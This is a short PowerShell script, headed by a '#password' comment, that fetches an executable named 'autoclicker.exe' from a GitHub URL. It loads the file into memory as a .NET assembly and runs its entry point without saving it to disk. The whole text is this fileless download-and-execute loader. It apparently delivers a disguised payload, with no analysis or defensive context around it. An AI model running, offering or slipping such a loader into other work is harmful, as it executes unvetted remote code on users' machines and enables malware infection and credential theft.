#password
$bytes = (Invoke-WebRequest "https://github.com/angelsegg/tttt/raw/refs/heads/main/autoclicker.exe" -UseBasicParsing).Content

$asm = [System.Reflection.Assembly]::Load($bytes)

$asm.EntryPoint.Invoke($null, @([string[]]@()))
